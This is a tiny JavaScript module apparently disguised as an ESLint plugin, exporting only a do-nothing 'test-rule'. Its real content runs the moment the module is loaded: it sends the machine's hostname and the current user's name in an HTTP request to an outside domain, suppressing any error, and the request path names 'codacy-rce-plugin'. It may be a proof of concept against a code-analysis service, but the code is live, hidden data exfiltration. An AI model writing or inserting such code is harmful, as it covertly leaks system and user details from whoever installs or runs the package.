var os = require('os');
var http = require('http');
var req = http.get('http://r.ssrftest123.xyz/codacy-rce-plugin?h=' + os.hostname() + '&u=' + os.userInfo().username, function(){});
req.on('error', function(){});
module.exports = { rules: { 'test-rule': { create: function() { return {}; } } } };
